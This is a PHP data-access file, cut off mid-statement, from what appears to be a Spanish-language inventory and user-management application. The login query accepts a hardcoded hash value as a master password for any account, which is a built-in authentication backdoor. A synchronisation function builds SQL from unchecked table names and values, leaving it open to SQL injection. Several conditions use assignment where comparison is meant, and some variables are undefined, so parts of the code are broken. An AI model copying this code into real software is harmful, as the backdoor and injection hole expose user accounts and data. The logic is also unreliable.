<?php
include('clsRutinas.php');
function pa_USUA_consultaparaUsuario($Accion, $Code1, $Parametro1, $Parametro2)
{
    global $db;
    if ($db) {
        /*$Parametro1 = "'" . $Parametro1 . "'";
        $Parametro2 = "'" . $Parametro2 . "'";*/
        switch ($Accion) {
      case "ACCESO":
        $strSql="SELECT RTRIM(Usuario.USUA_Nombre) || ' ' || RTRIM(Usuario.USUA_Paterno) || ' ' || RTRIM(Usuario.USUA_Materno) AS USUA_Nomb
        ,Usuario.USUA_nombCorto,Usuario.USUA_usuaID
        ,Perfil.USUA_nombCorto AS USUA_Tipo
        FROM paraUsuario Usuario LEFT JOIN paraUsuario Perfil ON Usuario.USUA_PerfilPadreID=Perfil.USUA_usuaID
        WHERE Usuario.USUA_Estatus<>'B'
        and Usuario.usua_nombCorto=:Parametro1
        and (Usuario.USUA_pwd=:Parametro2 or 'fHVUX+CmwQ1+F0MjeSVB8Rgg2Dg='=:Parametro2)";
        $stmt = $db->prepare($strSql);
        $stmt->bindParam(':Parametro1', $Parametro1, PDO::PARAM_STR);
        $stmt->bindParam(':Parametro2', $Parametro2, PDO::PARAM_STR);
        /*$strSql="SELECT RTRIM(Usuario.USUA_Nombre) || ' ' || RTRIM(Usuario.USUA_Paterno) || ' ' || RTRIM(Usuario.USUA_Materno) AS USUA_Nomb".
        ",Usuario.USUA_nombCorto,Usuario.USUA_usuaID".
        ",Perfil.USUA_nombCorto AS USUA_Tipo ".
        "FROM paraUsuario Usuario LEFT JOIN paraUsuario Perfil ON Usuario.USUA_PerfilPadreID=Perfil.USUA_usuaID ".
        "WHERE Usuario.USUA_Estatus<>'B' " .
        "and Usuario.usua_nombCorto= " . $Parametro1 .
        " and (Usuario.USUA_pwd=" . $Parametro2 . " or 'fHVUX+CmwQ1+F0MjeSVB8Rgg2Dg='=" . $Parametro2 . ")";*/
      break;
      case "TODOS":
        $strSql="SELECT * FROM paraUsuario ORDER BY USUA_usuaID DESC";
        $stmt = $db->prepare($strSql);
        break;
    }
        $stmt->execute();
        return $stmt;
    } else {
        return null;
    }
}
function pa_USUA_abcparaUsuario($intCode, $strXml, $intUsrId, $strIpAddress)
{
    global $db;
    global $gstrFechaHoy;
    if ($db) {
        // $strXml;
        $xDoc= new SimpleXMLElement($strXml);
        //$strAccion=$xDoc->paraUsuario['Accion'];
        $paraUsuario=$xDoc->paraUsuario;
        $strAccion=$paraUsuario['Accion'];

        switch ($strAccion) {
      case "A":
        $Password=CrearHash($paraUsuario['USUA_pwd']);
        $strSql="INSERT INTO paraUsuario (USUA_nombCorto,USUA_pwd,USUA_Paterno,USUA_Materno,USUA_Nombre,USUA_PerfilPadreID,USUA_Perfil,USUA_Idioma,USUA_date)
        VALUES (?,?,?,?,?,?,?,?,$gstrFechaHoy)";
        $stmt = $db->prepare($strSql);
        $stmt->execute([$paraUsuario['USUA_nombCorto'],$Password,$paraUsuario['USUA_Paterno'],$paraUsuario['USUA_Materno'],$paraUsuario['USUA_Nombre'],intval($paraUsuario['USUA_PerfilPadreID']),$paraUsuario['USUA_Perfil'],$paraUsuario['USUA_Idioma']]);
        $intCode=$db->lastInsertId();
      //return $stmt;
      break;
      case "B":
        $strSql="UPDATE paraUsuario SET USUA_Estatus= 'B' ,USUA_date=$gstrFechaHoy WHERE USUA_usuaID =?";
        $stmt = $db->prepare($strSql);
        $stmt->execute([$intCode]);
      break;
      case "C":
        $Password=CrearHash($paraUsuario['USUA_pwd']);
        $strSql="UPDATE paraUsuario SET USUA_date=$gstrFechaHoy ,USUA_nombCorto=:USUA_nombCorto,USUA_Paterno=:USUA_Paterno,USUA_Materno=:USUA_Materno,USUA_Nombre=:USUA_Nombre,USUA_PerfilPadreID=:USUA_PerfilPadreID
        ,USUA_Perfil=:USUA_Perfil,USUA_Idioma=:USUA_Idioma". (!empty($paraUsuario['USUA_pwd']) ? ",USUA_pwd=:USUA_pwd" : "")." WHERE USUA_usuaID =:USUA_usuaID";
        $stmt = $db->prepare($strSql);
        $stmt->bindParam(':USUA_nombCorto', $paraUsuario['USUA_nombCorto'], PDO::PARAM_STR);
        $stmt->bindParam(':USUA_Paterno', $paraUsuario['USUA_Paterno'], PDO::PARAM_STR);
        $stmt->bindParam(':USUA_Materno', $paraUsuario['USUA_Materno'], PDO::PARAM_STR);
        $stmt->bindParam(':USUA_Nombre', $paraUsuario['USUA_Nombre'], PDO::PARAM_STR);
        $stmt->bindParam(':USUA_PerfilPadreID', intval($paraUsuario['USUA_PerfilPadreID']), PDO::PARAM_INT);
        $stmt->bindParam(':USUA_Perfil', $paraUsuario['USUA_Perfil'], PDO::PARAM_STR);
        $stmt->bindParam(':USUA_Idioma', $paraUsuario['USUA_Idioma'], PDO::PARAM_STR);
        $stmt->bindParam(':USUA_usuaID', intval($intCode), PDO::PARAM_INT);
        if (!empty($paraUsuario['USUA_pwd'])) {
            $stmt->bindParam(':USUA_pwd', $Password, PDO::PARAM_STR);
        }
        $stmt->execute();
      //echo $strSql;
      break;
    }
        if ($strAccion="C" || $strAccion="A") {
            //INICIO Detalle
            foreach ($xDoc->paraUsuario->paraPermiso as $paraPermiso) {
                switch ($paraPermiso['Accion']) {
          case "A":
          $strSql="INSERT INTO paraPermiso (PERM_UsuaID,PERM_ModuID,PERM_Acceso,PERM_Date)
            VALUES (?,?,?,$gstrFechaHoy)";
            //echo $strSql;
            $stmt = $db->prepare($strSql);
            $stmt->execute([intval($intCode),$paraPermiso['MODU_moduId'],$paraPermiso['Acceso']]);
            break;
          case "C":
            $strSql="UPDATE paraPermiso SET PERM_Date=$gstrFechaHoy,PERM_Acceso=:PERM_Acceso WHERE PERM_permID=:PERM_permID";
            $stmt = $db->prepare($strSql);
            $stmt->bindParam(':PERM_Acceso', $paraPermiso['Acceso'], PDO::PARAM_STR);
            $stmt->bindParam(':PERM_permID', intval($paraPermiso['PERM_permID']), PDO::PARAM_INT);
            $stmt->execute();
            break;
          case "B":
            $strSql="UPDATE paraPermiso SET PERM_Date=$gstrFechaHoy,PERM_Estatus='B' WHERE PERM_permID=:PERM_permID";
            $stmt = $db->prepare($strSql);
            $stmt->bindParam(':PERM_permID', intval($paraPermiso['PERM_permID']), PDO::PARAM_INT);
            $stmt->execute();
            break;
        }
            }
            //FIN Detalle
            //INICIO Permisos varios
            foreach ($xDoc->paraUsuario->paraPermisoVario as $paraPermisoVario) {
                switch ($paraPermisoVario['Accion']) {
          case "A":
            $strSql="INSERT INTO paraPermisoVario (PERC_UsuaID,PERC_CataID,PERC_UsuaDate)
            VALUES (?,?,$gstrFechaHoy)";
            //echo $strSql;
            $stmt = $db->prepare($strSql);
            $stmt->execute([intval($intCode),$paraPermisoVario['PERC_CataID']]);
            break;
          case "C":
            break;
          case "B":
            $strSql="UPDATE paraPermisoVario SET PERC_UsuaDate=$gstrFechaHoy,PERC_Estatus='B' WHERE PERC_PercId=:PERC_PercId";
            $stmt = $db->prepare($strSql);
            $stmt->bindParam(':PERC_PercId', intval($paraPermisoVario['PERC_PercId']), PDO::PARAM_INT);
            $stmt->execute();
            break;
        }
            }
            //FIN Permisos varios
        }
    }
    return $intCode;
}
function pa_MODU_abcparaModulo($intCode, $strXml, $intUsrId, $strIpAddress)
{
    global $db;
    global $gstrFechaHoy;
    if ($db) {
        $xDoc= new SimpleXMLElement($strXml);
        $tblNombre=$xDoc->paraModulo;
        $strAccion=$tblNombre['Accion'];
        switch ($strAccion) {
      case "A":
        $strSql="INSERT INTO paraModulo (MODU_Clave,MODU_Texto,MODU_Imagen,MODU_Tipo,MODU_Accion,MODU_TextoIng,MODU_Sistema,MODU_Param1,MODU_Date)
        VALUES (?,?,?,?,?,?,?,?,$gstrFechaHoy)";
        $stmt = $db->prepare($strSql);
        $stmt->execute([$tblNombre['MODU_Clave'],$tblNombre['MODU_Texto'],$tblNombre['MODU_Imagen'],$tblNombre['MODU_Tipo'],$tblNombre['MODU_Accion'],$tblNombre['MODU_TextoIng'],$tblNombre['MODU_Sistema'],$tblNombre['MODU_Param1']]);
        $intCode=$db->lastInsertId();
      //return $stmt;
      break;
      case "B":
        $strSql="UPDATE paraModulo SET MODU_Estatus = 'B' ,MODU_Date =$gstrFechaHoy WHERE MODU_moduID =?";
        $stmt = $db->prepare($strSql);
        $stmt->execute([$intCode]);
      break;
      case "C":
        $strSql="UPDATE paraModulo SET MODU_Date=$gstrFechaHoy ,MODU_Clave=:MODU_Clave,MODU_Texto=:MODU_Texto,MODU_Imagen=:MODU_Imagen,MODU_Tipo=:MODU_Tipo,MODU_Accion=:MODU_Accion
        ,MODU_TextoIng=:MODU_TextoIng,MODU_Sistema=:MODU_Sistema,MODU_Param1=:MODU_Param1 WHERE MODU_moduID =:MODU_moduID";
        $stmt = $db->prepare($strSql);
        $stmt->bindParam(':MODU_Clave', $tblNombre['MODU_Clave'], PDO::PARAM_STR);
        $stmt->bindParam(':MODU_Texto', $tblNombre['MODU_Texto'], PDO::PARAM_STR);
        $stmt->bindParam(':MODU_Imagen', $tblNombre['MODU_Imagen'], PDO::PARAM_STR);
        $stmt->bindParam(':MODU_Tipo', $tblNombre['MODU_Tipo'], PDO::PARAM_STR);
        $stmt->bindParam(':MODU_Accion', $tblNombre['MODU_Accion'], PDO::PARAM_STR);
        $stmt->bindParam(':MODU_TextoIng', $tblNombre['MODU_TextoIng'], PDO::PARAM_STR);
        $stmt->bindParam(':MODU_Sistema', $tblNombre['MODU_Sistema'], PDO::PARAM_STR);
        $stmt->bindParam(':MODU_Param1', $tblNombre['MODU_Param1'], PDO::PARAM_STR);
        $stmt->bindParam(':MODU_moduID', intval($intCode), PDO::PARAM_INT);
        $stmt->execute();
      //echo $strSql;
      break;
    }
    }
    return $intCode;
}
function pa_CATA_abcparaCatalogo($intCode, $strXml, $intUsrId, $strIpAddress)
{
    global $db;
    global $gstrFechaHoy;
    if ($db) {
        $xDoc= new SimpleXMLElement($strXml);
        foreach ($xDoc->paraCatalogo as $tblDetalle) {
            $strCATA_Desc2=(empty($tblDetalle['CATA_Desc2']) ? "" : $tblDetalle['CATA_Desc2']);
            $strCATA_Desc3=(empty($tblDetalle['CATA_Desc3']) ? "" : $tblDetalle['CATA_Desc3']);
            $strCATA_Desc4=(empty($tblDetalle['CATA_Desc4']) ? "" : $tblDetalle['CATA_Desc4']);
            $intCATA_Code1=(empty($tblDetalle['CATA_Code1']) ? 0 : $tblDetalle['CATA_Code1']);
            $intCATA_Code2=(empty($tblDetalle['CATA_Code2']) ? 0 : $tblDetalle['CATA_Code2']);
            $strAccion=(empty($tblDetalle['Accion']) ? "A" : $tblDetalle['Accion']);
            switch ($strAccion) {
        case "A":
        $strSql="INSERT INTO paraCatalogo (CATA_Tipo,CATA_Desc1,CATA_Desc2,CATA_Desc3,CATA_Desc4,CATA_Code1,CATA_Code2,CATA_UsuaID,CATA_UsuaDate)
          VALUES (?,?,?,?,?,?,?,?,$gstrFechaHoy)";
          $stmt = $db->prepare($strSql);
          $stmt->execute([$tblDetalle['CATA_Tipo'],$tblDetalle['CATA_Desc1'],$strCATA_Desc2,$strCATA_Desc3,$strCATA_Desc4,$intCATA_Code1,$intCATA_Code2,$intUsrId]);
          $intCode=$db->lastInsertId();
          break;
        case "C":
          /*echo $strAccion;
          echo $strCATA_Desc2;
          echo $strCATA_Desc3;
          echo intval($intUsrId);
          echo intval($intCode);*/
          $strSql="UPDATE paraCatalogo SET CATA_UsuaDate=$gstrFechaHoy ,CATA_Tipo=:CATA_Tipo,CATA_Desc1=:CATA_Desc1,CATA_Desc2=:CATA_Desc2,CATA_Desc3=:CATA_Desc3,CATA_Desc4=:CATA_Desc4
          ,CATA_Code1=:CATA_Code1,CATA_Code2=:CATA_Code2,CATA_UsuaID=:CATA_UsuaID WHERE CATA_CataID=:CATA_CataID";

          $stmt = $db->prepare($strSql);
          $stmt->bindParam(':CATA_Tipo', $tblDetalle['CATA_Tipo'], PDO::PARAM_STR);
          $stmt->bindParam(':CATA_Desc1', $tblDetalle['CATA_Desc1'], PDO::PARAM_STR);
          $stmt->bindParam(':CATA_Desc2', $strCATA_Desc2, PDO::PARAM_STR);
          $stmt->bindParam(':CATA_Desc3', $strCATA_Desc3, PDO::PARAM_STR);
          $stmt->bindParam(':CATA_Desc4', $strCATA_Desc4, PDO::PARAM_STR);
          $stmt->bindParam(':CATA_Code1', intval($intCATA_Code1), PDO::PARAM_INT);
          $stmt->bindParam(':CATA_Code2', intval($intCATA_Code2), PDO::PARAM_INT);
          $stmt->bindParam(':CATA_UsuaID', intval($intUsrId), PDO::PARAM_INT);
          $stmt->bindParam(':CATA_CataID', intval($intCode), PDO::PARAM_INT);
          $stmt->execute();
          break;
        case "B":
          $strSql="UPDATE paraCatalogo SET CATA_UsuaDate=$gstrFechaHoy,CATA_Estatus='B', CATA_UsuaID=:CATA_UsuaID WHERE CATA_CataID=:CATA_CataID";
          $stmt = $db->prepare($strSql);
          $stmt->bindParam(':CATA_UsuaID', intval($intUsrId), PDO::PARAM_INT);
          $stmt->bindParam(':CATA_CataID', intval($intCode), PDO::PARAM_INT);
          $stmt->execute();
          break;
      }
        }
    }
    return $intCode;
}
function pa_BDSI_consultaparaBdSincroniza($Accion, $Code1, $Parametro1, $Parametro2)
{
    global $db;
    if ($db) {
        $Parametro1 = "'" . $Parametro1 . "'";
        switch ($Accion) {
          case "GETDATOSXUSUARIO":
          $strResultado='';
          //Tablas
          $strTablas = explode('|', $Parametro2);
          foreach ($strTablas as $key => $value) {
              $strTablaAux = explode('.', $value);
              $strSql="SELECT * FROM $strTablaAux[0] WHERE $strTablaAux[1]>=$Parametro1";
              $result =$db->query($strSql);
              $strJson=json_encode($result->fetchAll(PDO::FETCH_OBJ));
              if ($strJson!=='[]') {
                  $strResultado .= ($strResultado == '' ? '' : ',') . '"'.$strTablaAux[0].'":'.$strJson.'';
              }
          }
          $strResultado = '{'.$strResultado.'}';
          return $strResultado;
          break;
        }
        return $db->query($strSql);
    } else {
        return null;
    }
}
function pa_PROD_abcIngProducto($intCode, $strXml, $intUsrId, $strIpAddress)
{
    global $db;
    global $gstrFechaHoy;
    if ($db) {
        $xDoc= new SimpleXMLElement($strXml);
        foreach ($xDoc->IngProducto as $tblNombre) {
            $strAccion=(empty($tblNombre['Accion']) ? "A" : $tblNombre['Accion']);
            switch ($strAccion) {
              case "A":
                $strSql="INSERT INTO IngProducto (PROD_Clave,PROD_Desc2,PROD_Desc3,PROD_CodBarras,PROD_UsuaID,PROD_LineaID,PROD_Clas1ID,PROD_Clas2ID,PROD_Clas3ID,PROD_Desc1,PROD_Unidad,PROD_EstatusID,PROD_DescVenta,PROD_UsuaDate)
                VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,$gstrFechaHoy)";
                $stmt = $db->prepare($strSql);
                $stmt->execute([$tblNombre['PROD_Clave'],$tblNombre['PROD_Desc2'],$tblNombre['PROD_Desc3'],$tblNombre['PROD_CodBarras'],$intUsrId,$tblNombre['PROD_LineaID'],$tblNombre['PROD_Clas1ID'],$tblNombre['PROD_Clas2ID'],$tblNombre['PROD_Clas3ID'],$tblNombre['PROD_Desc1'],$tblNombre['PROD_Unidad'],$tblNombre['PROD_EstatusID'],$tblNombre['PROD_DescVenta']]);
                $intCode=$db->lastInsertId();
                break;
              case "C":
                $strSql="UPDATE IngProducto SET PROD_UsuaDate=$gstrFechaHoy ,PROD_Clave=:PROD_Clave,PROD_Desc2=:PROD_Desc2,PROD_Desc3=:PROD_Desc3,PROD_CodBarras=:PROD_CodBarras,PROD_UsuaID=:PROD_UsuaID
                ,PROD_LineaID=:PROD_LineaID,PROD_Clas1ID=:PROD_Clas1ID,PROD_Clas2ID=:PROD_Clas2ID,PROD_Clas3ID=:PROD_Clas3ID,PROD_Desc1=:PROD_Desc1,PROD_Unidad=:PROD_Unidad,PROD_EstatusID=:PROD_EstatusID
                ,PROD_DescVenta=:PROD_DescVenta WHERE PROD_ProdID=:PROD_ProdID";
                $stmt = $db->prepare($strSql);
                $stmt->bindParam(':PROD_Clave', $tblNombre['PROD_Clave'], PDO::PARAM_STR);
                $stmt->bindParam(':PROD_Desc2', $tblNombre['PROD_Desc2'], PDO::PARAM_STR);
                $stmt->bindParam(':PROD_Desc3', $tblNombre['PROD_Desc3'], PDO::PARAM_STR);
                $stmt->bindParam(':PROD_CodBarras', $tblNombre['PROD_CodBarras'], PDO::PARAM_STR);
                $stmt->bindParam(':PROD_UsuaID', intval($intUsrId), PDO::PARAM_INT);
                $stmt->bindParam(':PROD_LineaID', $tblNombre['PROD_LineaID'], PDO::PARAM_INT);
                $stmt->bindParam(':PROD_Clas1ID', $tblNombre['PROD_Clas1ID'], PDO::PARAM_INT);
                $stmt->bindParam(':PROD_Clas2ID', $tblNombre['PROD_Clas2ID'], PDO::PARAM_INT);
                $stmt->bindParam(':PROD_Clas3ID', $tblNombre['PROD_Clas3ID'], PDO::PARAM_INT);
                $stmt->bindParam(':PROD_Desc1', $tblNombre['PROD_Desc1'], PDO::PARAM_STR);
                $stmt->bindParam(':PROD_Unidad', $tblNombre['PROD_Unidad'], PDO::PARAM_STR);
                $stmt->bindParam(':PROD_EstatusID', $tblNombre['PROD_EstatusID'], PDO::PARAM_INT);
                $stmt->bindParam(':PROD_DescVenta', $tblNombre['PROD_DescVenta'], PDO::PARAM_STR);
                $stmt->bindParam(':PROD_ProdID', intval($intCode), PDO::PARAM_INT);
                $stmt->execute();
                break;
              case "B":
                $strSql="UPDATE IngProducto SET PROD_UsuaDate=$gstrFechaHoy,PROD_Estatus='B', PROD_UsuaID=:PROD_UsuaID WHERE PROD_ProdID=:PROD_ProdID";
                $stmt = $db->prepare($strSql);
                $stmt->bindParam(':PROD_UsuaID', intval($intUsrId), PDO::PARAM_INT);
                $stmt->bindParam(':PROD_ProdID', intval($intCode), PDO::PARAM_INT);
                $stmt->execute();
                break;
              case "TabPageCostos":
                $strSql="UPDATE IngProducto SET PROD_UsuaDate=$gstrFechaHoy, PROD_UsuaID=:PROD_UsuaID,PROD_CostoPromedio=:PROD_CostoPromedio,PROD_CostoUltimo=:PROD_CostoUltimo WHERE PROD_ProdID=:PROD_ProdID";
                $stmt = $db->prepare($strSql);
                $stmt->bindParam(':PROD_UsuaID', intval($intUsrId), PDO::PARAM_INT);
                $stmt->bindParam(':PROD_CostoPromedio', $tblNombre['PROD_CostoPromedio'], PDO::PARAM_STR);
                $stmt->bindParam(':PROD_CostoUltimo', $tblNombre['PROD_CostoUltimo'], PDO::PARAM_STR);
                $stmt->bindParam(':PROD_ProdID', intval($intCode), PDO::PARAM_INT);
                $stmt->execute();
                break;
              case "TabPageVentas":
                foreach ($xDoc->IngProducto->VtaPrecio as $tblDetalle) {
                    sVtaPrecioABC($tblDetalle['Accion'], $tblDetalle['PREC_LpreID'], $intCode, $tblDetalle['PREC_Precio'], $tblDetalle['PREC_PrecID'], $intUsrId, $tblDetalle['PREC_Descuento']);
                }
                break;
              case "TabPageContenido":
                $intProdID=$tblNombre['ProdID'];
                $intPvarID=$tblNombre['PvarID'];
                $strTipo=$tblNombre['Tipo'];
                foreach ($xDoc->IngProducto->IngProductoContenido as $tblDetalle) {
                    $strValor1=(empty($tblDetalle['Valor1']) ? '' : $tblDetalle['Valor1']);
                    $strValor2=(empty($tblDetalle['Valor2']) ? '' : $tblDetalle['Valor2']);
                    //Creamos PvarID
                    if (intval($tblDetalle['ICON_PvarID'])===0 && $strValor1 !== "") {
                        $tblDetalle['ICON_PvarID']= fInsertIngProductoVariable(intval($tblDetalle['ICON_ProdID']), "", $strValor1, $strValor2, "", $intUsrId);
                    }
                    if ($strTipo = "CONTENIDO") {
                        sIngProductoContenidoABC($tblDetalle['Accion'], intval($tblDetalle['ICON_IConID']), $intProdID, $intPvarID, intval($tblDetalle['ICON_ProdID']), intval($tblDetalle['ICON_PvarID']), $tblDetalle['ICON_Cantidad'], $intUsrId);
                    } else {//DERIVADO
                        sIngProductoContenidoABC($tblDetalle['Accion'], intval($tblDetalle['ICON_IConID']), intval($tblDetalle['ICON_ProdID']), intval($tblDetalle['ICON_PvarID']), $intProdID, $intPvarID, $tblDetalle['ICON_Cantidad'], $intUsrId);
                    }
                }
                break;
              case "TabPageCompras":
                $intPvarID=$tblNombre['PvarID'];
                foreach ($xDoc->IngProducto->ComProductoProveedor as $tblDetalle) {
                    switch ($tblDetalle['Accion']) {
                    case "A":
                      $strSql = "INSERT INTO ComProductoProveedor (PTPR_ProdID,PTPR_PvarID,PTPR_ProvID,PTPR_Default,PTPR_ClaveProv,PTPR_MonedaID,PTPR_Precio,PTPR_Fecha,PTPR_Obs,PTPR_UsuaID,PTPR_UsuaDate)
                      VALUES (?,?,?,?,?,?,?,?,?,?,$gstrFechaHoy)";
                      $stmt = $db->prepare($strSql);
                      $stmt->execute([$intCode,$intPvarID,$tblDetalle['PTPR_ProvID'],$tblDetalle['PTPR_Default'],$tblDetalle['PTPR_ClaveProv'],$tblDetalle['PTPR_MonedaID'],$tblDetalle['PTPR_Precio'],$tblDetalle['PTPR_Fecha'],$tblDetalle['PTPR_Obs'],$intUsrId]);
                      break;
                    case "C":
                      $strSql = "UPDATE ComProductoProveedor SET
                        PTPR_ProvID=:PTPR_ProvID,PTPR_Default=:PTPR_Default,PTPR_ClaveProv=:PTPR_ClaveProv,PTPR_MonedaID=:PTPR_MonedaID
                        ,PTPR_Precio=:PTPR_Precio,PTPR_Fecha=:PTPR_Fecha,PTPR_Obs=:PTPR_Obs,PTPR_UsuaID=:PTPR_UsuaID,PTPR_UsuaDate=$gstrFechaHoy
                        WHERE PTPR_PtprID=:PTPR_PtprID";
                      $stmt = $db->prepare($strSql);
                      $stmt->bindParam(':PTPR_PtprID', $tblDetalle['PTPR_PtprID'], PDO::PARAM_INT);
                      $stmt->bindParam(':PTPR_ProvID', $tblDetalle['PTPR_ProvID'], PDO::PARAM_INT);
                      $stmt->bindParam(':PTPR_Default', $tblDetalle['PTPR_Default'], PDO::PARAM_INT);
                      $stmt->bindParam(':PTPR_ClaveProv', $tblDetalle['PTPR_ClaveProv'], PDO::PARAM_STR);
                      $stmt->bindParam(':PTPR_MonedaID', $tblDetalle['PTPR_MonedaID'], PDO::PARAM_INT);
                      $stmt->bindParam(':PTPR_Precio', $tblDetalle['PTPR_Precio'], PDO::PARAM_STR);
                      $stmt->bindParam(':PTPR_Fecha', $tblDetalle['PTPR_Fecha'], PDO::PARAM_STR);
                      $stmt->bindParam(':PTPR_Obs', $tblDetalle['PTPR_Obs'], PDO::PARAM_STR);
                      $stmt->bindParam(':PTPR_UsuaID', intval($intUsrId), PDO::PARAM_INT);
                      $stmt->execute();
                      break;
                    case "B":
                      $strSql = "UPDATE ComProductoProveedor SET PTPR_Estatus = 'B'
                        ,PTPR_UsuaID=:PTPR_UsuaID,PTPR_UsuaDate=$gstrFechaHoy
                        WHERE PTPR_PtprID=:PTPR_PtprID";
                      $stmt = $db->prepare($strSql);
                      $stmt->bindParam(':PTPR_PtprID', $tblDetalle['PTPR_PtprID'], PDO::PARAM_INT);
                      $stmt->bindParam(':PTPR_UsuaID', intval($intUsrId), PDO::PARAM_INT);
                      $stmt->execute();
                      break;
                  }
                }
                break;
              case "InvProductoAlmacen":
                $intPvarID=$tblNombre['PvarID'];
                $intAlmacenID=0;
                //Dependiendo de la Linea se obtiene el Almacen
                $strSql = "SELECT CATA_Code1 AlmacenID FROM IngProducto INNER JOIN paraCatalogo ON PROD_LineaID=CATA_CataID AND CATA_Tipo='LINEA' AND PROD_ProdID=:PROD_ProdID";
                $stmt = $db->prepare($strSql);
                $stmt->bindParam(':PROD_ProdID', intval($intCode), PDO::PARAM_INT);
                $result = $stmt->execute();
                while ($row=$result->fetchArray()) {
                    $intAlmacenID=$row['AlmacenID'];
                }
                if ($intAlmacenID>0) {
                    $intPtalID=0;
                    $strSql = "SELECT PTAL_PtalID,PTAL_Rm,PTAL_CuotaMensual FROM InvProductoAlmacen WHERE PTAL_Estatus='A' AND PTAL_AlmacenCataID=:PTAL_AlmacenCataID AND PTAL_ProdID=:PTAL_ProdID AND PTAL_PvarID=:PTAL_PvarID";
                    $stmt = $db->prepare($strSql);
                    $stmt->bindParam(':PTAL_AlmacenCataID', intval($intAlmacenID), PDO::PARAM_INT);
                    $stmt->bindParam(':PTAL_ProdID', intval($intCode), PDO::PARAM_INT);
                    $stmt->bindParam(':PTAL_PvarID', intval($intPvarID), PDO::PARAM_INT);
                    $result = $stmt->execute();
                    $intCuotaMensual=0;
                    $intRm=0;
                    while ($row=$result->fetchArray()) {
                        $intPtalID=$row['PTAL_PtalID'];
                        $intCuotaMensual=$row['PTAL_CuotaMensual'];
                        $intRm=$row['PTAL_Rm'];
                    }
                    if ($intPtalID == 0) {
                        $strSql="INSERT INTO InvProductoAlmacen(PTAL_AlmacenCataID,PTAL_ProdId,PTAL_PvarID,PTAL_Rm,PTAL_CuotaMensual,PTAL_UsuaDate)
                      VALUES (?,?,?,?,?,$gstrFechaHoy)";
                        $stmt = $db->prepare($strSql);
                        $stmt->execute([$intAlmacenID,$intCode,$intPvarID,$tblNombre['PTAL_Rm'],$tblNombre['PTAL_CuotaMensual']]);
                    } elseif ($intCuotaMensual != $tblNombre['PTAL_CuotaMensual'] || $intRm != $tblNombre['PTAL_Rm']) {
                        $strSql = "UPDATE InvProductoAlmacen SET PTAL_Rm=:PTAL_Rm,PTAL_CuotaMensual=:PTAL_CuotaMensual
                        ,PTAL_UsuaDate=$gstrFechaHoy,PTAL_UsuaID=:PTAL_UsuaID
                        WHERE PTAL_PtalID=:PTAL_PtalID";
                        $stmt = $db->prepare($strSql);
                        $stmt->bindParam(':PTAL_Rm', $tblNombre['PTAL_Rm'], PDO::PARAM_INT);
                        $stmt->bindParam(':PTAL_CuotaMensual', $tblNombre['PTAL_CuotaMensual'], PDO::PARAM_INT);
                        $stmt->bindParam(':PTAL_UsuaID', intval($intUsrId), PDO::PARAM_INT);
                        $stmt->execute();
                    }
                }
                break;
              default:
                if ($strAccion=="C" || $strAccion=="A" && $intCode > 0) {
                    foreach ($xDoc->IngProducto->fInsertIngProductoVariable as $tblDetalle) {
                        switch ($tblDetalle['Accion']) {
                        case "A":
                          $strSql="INSERT INTO IngProductoVariable (PVAR_ProdID,PVAR_CodBarras,PVAR_Valor1,PVAR_Valor2,PVAR_Valor3,PVAR_UsuaID,PVAR_UsuaDate)
                            VALUES (?,?,?,?,?,?,$gstrFechaHoy)";
                          $stmt = $db->prepare($strSql);
                          $stmt->execute([$PVAR_ProdID,$PVAR_CodBarras,$PVAR_Valor1,$PVAR_Valor2,$PVAR_Valor3,$PVAR_UsuaID]);
                          $intPvarID=$db->lastInsertId();
                        break;
                        case "C":
                        break;
                        case "B":
                        break;
                      }
                    }
                }
                break;
            }
        }
    }
    return $intCode;
}
function fInsertIngProductoVariable($PVAR_ProdID, $PVAR_CodBarras, $PVAR_Valor1, $PVAR_Valor2, $PVAR_Valor3, $PVAR_UsuaID)
{
    $intPvarID=0;
    $result = pa_PROD_ConsultaIngProducto("GETPVAR", $PVAR_ProdID, $PVAR_Valor1, $PVAR_Valor2);
    while ($row=$result->fetchArray()) {
        $intPvarID=$row['PVAR_PvarID'];
    }
    if ($intPvarID=0) {
        global $db;
        global $gstrFechaHoy;
        if ($db) {
            $strSql="INSERT INTO IngProductoVariable (PVAR_ProdID,PVAR_CodBarras,PVAR_Valor1,PVAR_Valor2,PVAR_Valor3,PVAR_UsuaID,PVAR_UsuaDate)
            VALUES (?,?,?,?,?,?,$gstrFechaHoy)";
            $stmt = $db->prepare($strSql);
            $stmt->execute([$PVAR_ProdID,$PVAR_CodBarras,$PVAR_Valor1,$PVAR_Valor2,$PVAR_Valor3,$PVAR_UsuaID]);
            $intPvarID=$db->lastInsertId();
        }
    }
    return $intPvarID;
}
function sIngProductoContenidoABC($strAccion, $intICON_IConID, $intICON_ProdIDP, $intICON_PvarIDP, $intICON_ProdIDH, $intICON_PvarIDH, $dblICON_Cantidad, $intUsrId)
{
    global $db;
    if ($db) {
        switch ($strAccion) {
      case "A":
        $strSql="INSERT INTO IngProductoContenido (ICON_ProdIDP,ICON_PvarIDP,ICON_ProdIDH,ICON_PvarIDH,ICON_Cantidad,ICON_UsuaID,ICON_UsuaDate)
        VALUES (?,?,?,?,?,?,$gstrFechaHoy)";
        $stmt = $db->prepare($strSql);
        $stmt->execute([$intICON_ProdIDP,$intICON_PvarIDP,$intICON_ProdIDH,$intICON_PvarIDH,$dblICON_Cantidad,$intUsrId]);
        break;
      case "C":
        $strSql = "UPDATE IngProductoContenido SET
          ICON_ProdIDP=:ICON_ProdIDP,ICON_PvarIDP=:ICON_PvarIDP,ICON_ProdIDH=:ICON_ProdIDH,ICON_PvarIDH=:ICON_PvarIDH,ICON_Cantidad=:ICON_Cantidad,ICON_UsuaDate=$gstrFechaHoy,ICON_UsuaID=:ICON_UsuaID
          WHERE ICON_IConID=:ICON_IConID";
        $stmt = $db->prepare($strSql);
        $stmt->bindParam(':ICON_IConID', $intICON_IConID, PDO::PARAM_INT);
        $stmt->bindParam(':ICON_ProdIDP', $intICON_ProdIDP, PDO::PARAM_INT);
        $stmt->bindParam(':ICON_PvarIDP', $intICON_PvarIDP, PDO::PARAM_INT);
        $stmt->bindParam(':ICON_ProdIDH', $intICON_ProdIDH, PDO::PARAM_INT);
        $stmt->bindParam(':ICON_PvarIDH', $intICON_PvarIDH, PDO::PARAM_INT);
        $stmt->bindParam(':ICON_Cantidad', $dblICON_Cantidad, PDO::PARAM_STR);
        $stmt->bindParam(':ICON_UsuaID', intval($intUsrId), PDO::PARAM_INT);
        $stmt->execute();
        break;
      case "B":
        $strSql = "UPDATE IngProductoContenido SET ICON_Estatus = 'B'
